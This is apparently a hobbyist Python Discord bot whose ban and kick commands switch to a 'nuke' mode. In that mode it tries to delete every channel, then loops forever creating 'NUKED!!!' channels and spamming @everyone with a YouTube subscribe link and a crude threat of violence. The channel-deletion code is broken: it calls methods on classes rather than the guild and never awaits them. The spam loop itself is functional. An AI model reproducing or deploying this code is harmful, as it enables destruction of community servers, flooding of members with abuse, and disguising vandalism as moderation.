import discord
from discord.ext import commands
import time
from discord import Intents

mode = input("Which mode should it be in? N for nuke, D for display.")

TOKEN = 'put token here'

bot = commands.Bot(command_prefix='skib?', intents=Intents.all())

@bot.command()
async def ban(ctx, member, reason):
    if mode == "N":
        print("THEY TRIED TO BAN SOMEONE ON NUKE MODE! RATTLE EM' BOYS!!!!!!!!!!!!!!!!")
        time.sleep(1)
        await ctx.send(f"YOU PICKED THE WRONG HOUSE FOOL")
        for i in discord.Guild.channels:
            if i == discord.TextChannel:
                discord.TextChannel.delete(i)
            elif i == discord.VoiceChannel:
                discord.VoiceChannel.delete(i)
            else:
                discord.ForumChannel.delete(i)
    # Create new channels
        while True:
            await ctx.guild.create_text_channel('NUKED!!!')
            await ctx.send(f"@everyone NUKED BY THESPIRALOFPOWAH! [GO SUB NOW](https://youtube.com/@thespiralofpowah?sub_confirmation=1) OR I WILL CHOP YOUR DICK OFF")
    else:
        if member:
            await member.ban(reason=reason)
            await ctx.send(f"Banned {member.mention}. That gyatt bastard didn't stand a chance.")
        else:
            await ctx.send(f"You didn't specify a user, you skibidi idiot. You lost all your rizz")

@bot.command()
async def kick(ctx, member, reason):
    if mode == "N":
        print("THEY TRIED TO KICK SOMEONE ON NUKE MODE! RATTLE EM' BOYS!!!!!!!!!!!!!!!!")
        time.sleep(1)
        await ctx.send(f"YOU PICKED THE WRONG HOUSE FOOL")
        for i in discord.Guild.channels:
            if i == discord.TextChannel:
                discord.TextChannel.delete(i)
            elif i == discord.VoiceChannel:
                discord.VoiceChannel.delete(i)
            else:
                discord.ForumChannel.delete(i)
        # Create new channels
        while True:
            await ctx.guild.create_text_channel('NUKED!!!')
            await ctx.send(f"@everyone NUKED BY THESPIRALOFPOWAH! [GO SUB NOW](https://youtube.com/@thespiralofpowah?sub_confirmation=1) OR I WILL CHOP YOUR DICK OFF")
    else:
        if member:
            await member.kick(reason=reason)
            await ctx.send(f"Kicked {member.mention}. That gyatt bastard didn't stand a chance.")
        else:
            await ctx.send(f"You didn't specify a user, you skibidi idiot. You lost all your rizz")

# Begin bot
bot.run(TOKEN)
